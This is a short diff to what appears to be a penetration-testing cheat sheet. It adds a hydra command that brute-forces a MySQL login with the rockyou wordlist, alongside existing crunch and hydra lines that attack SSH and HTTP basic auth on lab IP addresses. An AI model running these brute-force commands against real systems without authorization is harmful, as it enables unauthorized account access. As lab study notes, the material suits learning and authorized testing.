@@ -18,6 +18,7 @@ crunch 6 6 -t Lab%%% > wordlist    #Create custom password list using crunch. Mi
 #Hydra
 hydra -l username -P wordlist  192.168.50.214 -t 4 ssh -V    #Brute force ssh password
 hydra -L usernamelist -p password  192.168.50.214 -t 4 ssh    #Brute force ssh username with known password
+hydra -l zino -P /home/kali/wordlists/rockyou.txt 192.168.164.64 mysql -t 16 #Brute force mysql port 3306
 
 #Brute Force Basic Auth password on webdav directory on port 80
 hydra -l ian -P ~/wordlists/rockyou.txt 192.168.173.161 -s 80 http-get /webdav
